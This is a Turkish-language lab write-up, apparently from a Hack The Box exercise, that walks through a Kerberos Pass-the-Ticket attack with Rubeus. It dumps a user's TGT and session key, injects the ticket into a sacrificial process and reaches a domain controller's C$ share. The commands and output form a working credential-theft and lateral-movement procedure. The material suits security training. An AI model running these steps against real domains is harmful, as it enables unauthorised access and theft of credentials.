# Pass-the-Ticket

## Introduction

* LSASS etkileşimi olmadan yanal hareket amaçlanır.
* LSASS etkileşiminden kaçınmak gizli kalmak açısından son derece önemlidir.
* Yanal hareket için TGT kullanılabilir.
* Yanal hareket için TGS bileti kullanılabilir.

## [Reading](https://github.com/GhostPack/Rubeus/blob/master/README.md#triage) Tickets

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe triage
```

```output title="Output" hl_lines="8"
Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0xd530b

 --------------------------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                              | Service                                           | EndTime               |
 --------------------------------------------------------------------------------------------------------------------------------
 | 0x1960b1 | jefferson.matts @ INLANEFREIGHT.LOCAL | krbtgt/INLANEFREIGHT.LOCAL                        | 1/30/2025 12:42:05 AM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | krbtgt/INLANEFREIGHT.LOCAL                        | 1/29/2025 11:58:46 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | LDAP/DC01.INLANEFREIGHT.LOCAL                     | 1/29/2025 11:58:46 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | cifs/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 1/29/2025 11:58:46 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | WS01$                                             | 1/29/2025 11:58:46 PM |
 | 0x3e7    | ws01$ @ INLANEFREIGHT.LOCAL           | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 1/29/2025 11:58:46 PM |
 | 0xd530b  | htb-student @ INLANEFREIGHT.LOCAL     | krbtgt/INLANEFREIGHT.LOCAL                        | 1/30/2025 12:13:47 AM |
 | 0xd530b  | htb-student @ INLANEFREIGHT.LOCAL     | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL | 1/30/2025 12:13:47 AM |
 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | krbtgt/INLANEFREIGHT.LOCAL                        | 1/29/2025 11:59:13 PM |
 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | ldap/dc01.inlanefreight.local/INLANEFREIGHT.LOCAL | 1/29/2025 11:59:13 PM |
 | 0x3e4    | ws01$ @ INLANEFREIGHT.LOCAL           | cifs/DC01.INLANEFREIGHT.LOCAL                     | 1/29/2025 11:59:13 PM |
 --------------------------------------------------------------------------------------------------------------------------------
```

## Extracting the Ticket (Jefferson Matts)

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe dump /luid:0x1960b1 /service:krbtgt /nowrap
```

```output title="Output" hl_lines="7 9 19 31"
Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x1960b1
[*] Current LUID    : 0xd530b

  UserName                 : jefferson.matts
  Domain                   : INLANEFREIGHT
  LogonId                  : 0x1960b1
  UserSID                  : S-1-5-21-1870146311-1183348186-593267556-1131
  AuthenticationPackage    : Kerberos
  LogonType                : Batch
  LogonTime                : 1/29/2025 2:42:05 PM
  LogonServer              : DC01
  LogonServerDNSDomain     : INLANEFREIGHT.LOCAL
  UserPrincipalName        : jefferson.matts@INLANEFREIGHT.LOCAL


    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  jefferson.matts
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  1/29/2025 2:42:05 PM
    EndTime                  :  1/30/2025 12:42:05 AM
    RenewTill                :  2/5/2025 2:42:05 PM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  pJcMjVOih8Wdqs5BGNBIeJATZn/jF1BBkf1elK6sYbM=
    Base64EncodedTicket   :

      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
```

## Creating a Sacrificial Process

!!! danger

    * Bir hesap Kerberos biletini kaybederse ilgili servisi ya da sistemi yeniden başlatmak gerekebilir.
    * Olası kayıpları [önlemek](https://github.com/GhostPack/Rubeus/blob/master/README.md#createnetonly) için [Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/) kurban işlemi başlatılabilir.

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe createnetonly /show /program:"powershell.exe"
```

```output title="Output" hl_lines="10 12"
[*] Action: Create Process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : 9VOUKR5D
[*] Domain          : ZU47ORWJ
[*] Password        : V200UWJR
[+] Process         : 'powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2712
[+] LUID            : 0x16bcc0
```

## Reviewing Current Session Tickets

!!! warning

    Kurban oturumda henüz bir bilet olmadığına dikkat edilmelidir.

```pwsh
PS C:\Users\htb-student> klist
```

```output title="Output" hl_lines="1"
Current LogonId is 0:0x16bcc0

Cached Tickets: (0)
```

## Renewing the Captured Ticket

!!! success

    Daha önceden 0x1960b1 oturumunda elde edilen Jefferson Matts kullanıcısına ait bilet 0x16bcc0 kurban oturumuna dahil edilir.

```pwsh
PS C:\Users\htb-student> C:\Tools\Rubeus.exe renew /ptt /ticket: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
```

```output title="Output" hl_lines="4"
[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\jefferson.matts'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIGSzCCBkegAwIBBaEDAgEWooIFMzCCBS9hggUrMIIFJ6ADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTdMIIE2aADAgESoQMC
      AQKiggTLBIIExxBQrBlpuGYkDM1pZbFPDJ+v/iCgmA4zFL7INVU5HGjcbKIZ999vZZAB7hBBJgnRzXYR
      pSvDN47U1zehKEa3UOqfxmZiSBotoKKpzxPNsL+AgBuDlgWlyS2+tJRCklRnpv6fWBeNbNuDPxuuLDO8
      /sgACGN3YWZAL2P9VRUVbLQm9cWWTd3tmrQSj88WLnNFonjeyxhUdzZ7+0ZfSe31idLk4W8qgqvv31EO
      4pBrvR4ReOo7NfAb5NZftTbN7NECjijx4h/H+qD4mfAvfFiBLcb1zaslud+XC+Jbglx7KmB7chbe15d2
      crz9RWxIvBgrKq5TZuYWF4Qy/pSvK7tTe+RN0nAXqkIaoDVwGZPXPaS0GaTvV7/L/AHF8lJJPJzBn0Rj
      /r9e0/NBHdEbh1yvY4rKuKDh1Pt2+LMBTfkASwd5jx4NGQIOXphFDAbq3E0QOZz8B7mTG1Tk8pCOZPi0
      LjTUKNacvqMexz7yR+0wnK+qOapMtR/rCBlf2kWhlHiLmJF0pe5p33/xM0majlLc5FMCDXWf99nhHKcg
      ibiCY+sbYRK0D+rCD+f8dhZXQDqfX2mNCjl/sRXwlOi3UUMi84ysittvQMFzwaamtLDM1ZBBSJ+pgeH9
      PVQyypQXPqAxWFTellodMi4t0xnIGiujT3EBBq0Pxl+9E5TKnUet86fLFx945ZLpTNDdBBulrrsVXsq6
      OXIKCkiByRmzpWTq+0UfyfCTzq16YsVbCbzXtFxdn2VVvQTxqvxdgkzPfEIt4LhPosuXrmXwXH2doPll
      2phl1g8YGn9XlZobbBxbDJSXYdIynB2ihoHJIsUKhs6H81hBkUUe+XSXF/o3d8+wUGs5cqQYkQDeZ3Zv
      ePW4y198HZBHlPrIIztHDvXUXknwfFWfqlfh9Nyq0mPVe4wljSiqIK2NkkcYIBUkxW0aahXEYp2tF1+K
      YxCZ8sxPRwsQgri6QF31/9nfJJ2o++n/tJqzkjr0XabZw1vJsUpfI2Cl/4b2nBPo/oWCkeOSu6+y20l0
      SiuKtPwz5CdOP2Qxop1hsSJtWqjVFRs5TVON8VRMTN87Cv97PYw6Mki1hyOZGe5YKJg6Kui3ayOoGUGZ
      JfqLBJC9n6ouHnKjnxVaLFEWLeSW/HXyO2oqkjP1QkMqTAT7pwbTlgN9mLBn0Qjzf9CT0bRFtesFH2sB
      fbf/QUmCYxuefTGxcOhDak0v32mz8ONKzc/C8JZi0sEKKqZtiFtfH2e/w/jYwpQ+MqU0USPefyZSGypV
      GrbrTpGelBSGn2WdtGUy5IMRBc7Qp1nMAd0GlkgQVKZ1kn/wU3JHaefNjBscoKSEBmVPoYCMgaiWINxB
      ed5WtJSrk+olTB/8UXgzuuQ2whe69hWTKLlp40tq9c69mkcZT1cm3vjZgEIHG6qcSgCZbymZK0IM3xBy
      chTOePEh4sWX4Tgz+e5/4FA5ed3qngsYFC+jAYOYywvv3jTNRId02cpiSsGvOUlz5jY2/9h8kETFFl5G
      OKHnTvp0a6zSTRSeacVMpi18kOCIRAT7dZsCDTExxPCuceFug4mSxeUlRdvhryDyanC24tbPwtA99yGy
      qZEwT69fDr4bQ+dUqMlb1pjpPKZaOISb2J4QopptJ/Xno4IBAjCB/6ADAgEAooH3BIH0fYHxMIHuoIHr
      MIHoMIHloCswKaADAgESoSIEIKSXDI1ToofFnarOQRjQSHiQE2Z/4xdQQZH9XpSurGGzoRUbE0lOTEFO
      RUZSRUlHSFQuTE9DQUyiHDAaoAMCAQGhEzARGw9qZWZmZXJzb24ubWF0dHOjBwMFAEDhAAClERgPMjAy
      NTAxMjkyMDUwNDBaphEYDzIwMjUwMTMwMDY1MDQwWqcRGA8yMDI1MDIwNTIwNDIwNVqoFRsTSU5MQU5F
      RlJFSUdIVC5MT0NBTKkoMCagAwIBAqEfMB0bBmtyYnRndBsTSU5MQU5FRlJFSUdIVC5MT0NBTA==
[+] Ticket successfully imported!
```

## Reviewing Current Session Tickets (Again)

```pwsh
PS C:\Users\htb-student> klist
```

```output title="Output" hl_lines="1 5-6"
Current LogonId is 0:0x16bcc0

Cached Tickets: (1)

#0>     Client: jefferson.matts @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 1/29/2025 14:50:40 (local)
        End Time:   1/30/2025 0:50:40 (local)
        Renew Time: 2/5/2025 14:42:05 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

## Listing Directory Contents

```pwsh
PS C:\Users\htb-student> dir \\DC01.INLANEFREIGHT.LOCAL\C$
```

```output title="Output"
 Volume in drive \\DC01.INLANEFREIGHT.LOCAL\C$ has no label.
 Volume Serial Number is 54FC-41C7

 Directory of \\DC01.INLANEFREIGHT.LOCAL\C$

04/03/2023  01:58 PM    <DIR>          carole.holmes
02/25/2022  10:20 AM    <DIR>          PerfLogs
10/06/2021  02:50 PM    <DIR>          Program Files
04/12/2023  02:24 PM    <DIR>          Program Files (x86)
03/30/2023  10:08 AM    <DIR>          Shares
04/04/2023  12:49 PM    <DIR>          Tools
03/30/2023  02:13 PM    <DIR>          Unconstrained
04/04/2023  10:34 AM    <DIR>          Users
10/14/2022  05:49 AM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)   3,019,632,640 bytes free
```
